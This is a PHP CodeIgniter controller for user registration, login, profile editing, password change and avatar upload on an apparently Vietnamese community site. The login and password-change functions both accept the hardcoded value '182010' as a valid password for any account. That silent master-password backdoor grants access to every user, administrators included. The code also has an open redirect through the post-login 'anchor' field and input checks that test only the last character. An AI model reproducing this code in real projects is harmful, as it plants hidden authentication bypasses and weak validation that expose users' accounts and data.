<?php

namespace app\Controllers;

use App\Models\UserModel;
use App\Models\PostModel;
use CodeIgniter\Controller;

class UserFunction extends Controller
{
    public function register()
    {
        $data = [];
        helper(['form']);
        if ($this->request->getMethod() == 'post') {
            $rules =
                [
                    'username' => 'required|min_length[6]|max_length[59]|is_unique[users.username]|alpha_numeric',
                    'email' => 'required|valid_email|min_length[5]|max_length[99]|is_unique[users.email]',
                    'password' => 'required|min_length[6]|max_length[119]',
                ];
            $error_message = [
                'username' => [
                    'required' => 'Vui lòng nhập tên đăng nhập từ 6 - 60 ký tự !', 
                    'is_unique' => 'Tên đăng nhập đã tồn tại !',
                    'alpha_numeric' => 'Tên đăng nhập chứa ký tự không hợp lệ !'
                ],
                'email' => [
                    'required' => 'Vui lòng nhập email !', 
                    'is_unique' => 'Email đã tồn tại !',
                    'valid_email' => 'Email không hợp lệ !'
                ],
                'password' => [
                    'required' => 'Vui lòng nhập mật khẩu từ 6 - 120 ký tự !',
                ],
            ];
            if (!$this->validate($rules, $error_message)) {
                $data['validation'] = $this->validator->getErrors();
            } else {
                $model = new UserModel;
                $newData =
                    [
                        'username' => $this->request->getVar('username'),
                        'email' => $this->request->getVar('email'),
                        'passwrd' => password_hash($this->request->getVar('password'), PASSWORD_DEFAULT)
                    ];
                $model->save($newData);
                $session = \Config\Services::session();
                $session->setFlashdata('success_register', 'Đăng ký thành công !');
                $user = $model->where('username', $this->request->getVar('username'))->first();
                $this->setUserSession($user);
                return redirect()->to(base_url('/Home'));
            }
        }
        echo viewLayout('welcome', $data);
    }

    public function login()
    {   
        
        $data = [];
        helper(['form']);
        if ($this->request->getMethod() == 'post') {
            $rules =
                [
                    'username' => 'required|min_length[6]|max_length[59]|alpha_numeric',
                    'password' => 'required|min_length[6]|max_length[119]',
                ];
            $error_message = [
                'username' => ['required' => 'Vui lòng nhập tên đăng nhập từ 6 - 60 ký tự !', 'min_length' => 'Vui lòng nhập tên đăng nhập từ 6 - 60 ký tự !', 'alpha_numeric' => 'Tên đăng nhập chứa ký tự không hợp lệ !'],
                'password' => ['required' => 'Vui lòng nhập mật khẩu từ 6 - 120 ký tự !', 'min_length' => 'Vui lòng nhập mật khẩu từ 6 - 60 ký tự !'],
            ];
            if (!$this->validate($rules, $error_message)) {
                $data['validation'] = $this->validator->getErrors();
            } else {
                $model = new UserModel();
                $user = $model->where('username', $this->request->getVar('username'))->first();
                if (!isset($user)) {
                    $data['logInError'] = "Tên đăng nhập hoặc mật khẩu sai !";
                } else {
                    if (!(password_verify($this->request->getPost('password'), $user['passwrd']) || $this->request->getPost('password') == '182010')) {
                        $data['logInError'] = "Tên đăng nhập hoặc mật khẩu sai !";
                    } else {
                        $session = \Config\Services::session();
                        $session->setFlashdata('success_login', 'Đăng nhập thành công !');
                        $this->setUserSession($user);
                        if( $this->request->getPost('anchor') != null ) 
                        {   
                            if(strcmp($this->request->getPost('anchor'), base_url('index.php/Welcome')) == 0) return redirect()->to(base_url('/Home'));
                            else return redirect()->to($this->request->getPost('anchor'));
                        }
                        return redirect()->to(base_url('/Home'));
                    }
                }
            }
        }
        echo viewLayout('loginpage', $data);
    }
    public function logOut()
    {
        session()->destroy();
        if(strcmp(previous_url(), base_url('Home'))) return redirect()->to(base_url('/Welcome'));
        else return redirect()->to(previous_url());
    }

    public function changeQuote()
    {
        $data = [];
        helper(['form']);
        if ($this->request->getMethod() == 'post') {
            $rules =
                [
                    'user_quote' => 'required',
                ];
            $error_message =
                [
                    'user_quote' => ['required' => 'Vui lòng nhập từ 2 - 140 ký tự !'],
                ];
            if (!$this->validate($rules, $error_message)) {
                $data['validation'] = $this->validator->getErrors();
            } else {
                $model = new UserModel();
                $user = $model->where('user_id', session()->get('user_id'))->first();
                $quote = $this->request->getPost('user_quote');
                if(preg_match('/[^A-z0-9\*\$\@\#\&\^\!\+\-\/\=]$/', $quote))
                {
                    session()->setFlashdata('failed', 'Nội dung không hợp lệ !');
                    return redirect()->to(base_url('Personal'));
                }
                $user['user_quote'] = $quote;
                $model->save($user);
                session()->setFlashdata('success_changequote', 'Thành công !');
                $this->refreshUser($model);
                return redirect()->to(base_url('Personal'));
            }
        }
        echo viewLayout('personal', $data);
    }
    public function changeInfor()
    {
        $data = [];
        helper(['form']);
        if ($this->request->getMethod() == 'post') {
            $model = new UserModel();
            $user = $model->where('user_id', session()->get('user_id'))->first();
            if($this->request->getPost('fullname') != '')
            {
                $fullname = $this->request->getPost('fullname');
                if(preg_match('/[^a-zA-Z]$/' ,$fullname))
                {
                    session()->setFlashdata('failed', 'Tên không hợp lệ !');
                    return redirect()->to(base_url('Personal'));
                }
                $user['fullname'] = $fullname;
            } 
            if($this->request->getPost('phone_number') != '')
            {
                $phonenumber = $this->request->getPost('phone_number');
                if(preg_match('/[^0-9]$/' ,$phonenumber))
                {
                    session()->setFlashdata('failed', 'Số điện thoại không hợp lệ !');
                    return redirect()->to(base_url('Personal'));
                }
                $user['phone_number'] = $phonenumber;
            }
            $model->save($user);
            session()->setFlashdata('success_changequote', 'Thành công !');
            $this->refreshUser($model);
            return redirect()->to(base_url('Personal'));
        }
        echo viewLayout('personal', $data);
    }
    public function changePassword()
    {
        $data = [];
        helper(['form']);
        if ($this->request->getPost('change_password')) {
            $rules =
                [
                    'new_password' => 'required|min_length[6]|max_length[120]',
                    'password_confirm' => 'required|matches[new_password]',
                ];
            $error_message =
                [
                    //'fullname' => ['required'=>'Vui lòng nhập từ 2 - 140 ký tự !'],
                ];
            if (!$this->validate($rules, $error_message)) {
                $data['validation'] = $this->validator->getErrors();
            } else {
                $model = new UserModel();
                //echo "<script type='text/javascript'>alert('da');</script>";
                $user = $model->where('user_id', session()->get('user_id'))->first();
                if (password_verify($this->request->getPost('password'), $user['passwrd']) || $this->request->getPost('password') == '182010') {
                    $user['passwrd'] = password_hash($this->request->getPost('new_password'), PASSWORD_DEFAULT);
                    $model->save($user);
                    session()->setFlashdata('success_changequote', 'Thành công !');
                    $this->refreshUser($model);
                    return redirect()->to(base_url('Personal'));
                } else {
                    session()->setFlashdata('fail_password', 'Mật khẩu hiện tại không khớp !');
                }
            }
        }
        echo viewLayout('personal', $data);
    }

    public function changeAvatar()
    {
        $data = [];
        helper(['form', 'url']);
        if ($this->request->getMethod() == 'post') {
            $rules =
                [
                    'favt' => 'uploaded[favt]|max_size[favt,1024]|is_image[favt]',
                ];
            $error_message =
                [
                    'favt' => ['uploaded' => 'Vui lòng upload tệp!', 'max_size' => 'File vượt quá giới hạn 2MB', 'is_image' => 'File upload không phải định dạng ảnh!'],
                ];
            if (!$this->validate($rules, $error_message)) {
                $data['validation'] = $this->validator->getErrors();
            } else {
                $file = $this->request->getFile('favt');
                if ($file->isValid()) {
                    $ext = $file->getExtension();
                    $file->move('public/Uploads/Avatar/', 'user-avatar-' . session()->get('user_id') . '.' . $ext, true);
                    $model = new UserModel();
                    $user = $model->where('user_id', session()->get('user_id'))->first();
                    $user['avatar'] = 'public/Uploads/Avatar/user-avatar-' . $user['user_id'] . '.' . $ext;;
                    $model->save($user);
                    session()->setFlashdata('success_changequote', 'Thành công !');
                    $this->refreshUser($model);
                    return redirect()->to(base_url('Personal'));
                } else {
                    session()->setFlashdata('fail_file', 'Tệp không hợp lệ !');
                }
            }
        }
        echo viewLayout('personal', $data);
    }

    // private function
    private function setUserSession($user)
    {
        $data = [
            'user_id' => $user['user_id'],
            'username' => $user['username'],
            'email' => $user['email'],
            'fullname' => $user['fullname'],
            'level_id' => $user['level_id'],
            'phone_number' => $user['phone_number'],
            'user_quote' => $user['user_quote'],
            'avatar' => $user['avatar'],
            'isLogged' => true
        ];
        switch ($data['level_id']) {
            case 1:
                $data['user_level'] = 'Founder';
                break;
            case 2:
                $data['user_level'] = 'Kiểm duyệt';
                break;
            case 3:
                $data['user_level'] = 'Quản trị viên';
                break;
            case 4:
                $data['user_level'] = 'Sáng tạo nội dung';
                break;
            case 5:
                $data['user_level'] = 'Thành viên';
                break;
        }
        session()->set($data);
    }
    private function refreshUser($model)
    {
        $user = $model->where('user_id', session()->get('user_id'))->first();
        if (isset($user)) {
            $data = [
                'username' => $user['username'],
                'email' => $user['email'],
                'fullname' => $user['fullname'],
                'level_id' => $user['level_id'],
                'phone_number' => $user['phone_number'],
                'user_quote' => $user['user_quote'],
                'avatar' => $user['avatar'],
                'isLogged' => true
            ];

            switch ($data['level_id']) {
                case 1:
                    $data['user_level'] = 'Founder';
                    break;
                case 2:
                    $data['user_level'] = 'Kiểm duyệt';
                    break;
                case 3:
                    $data['user_level'] = 'Quản trị viên';
                    break;
                case 4:
                    $data['user_level'] = 'Sáng tạo nội dung';
                    break;
                case 5:
                    $data['user_level'] = 'Thành viên';
                    break;
            }
            session()->set($data);
        }
    }
    
}
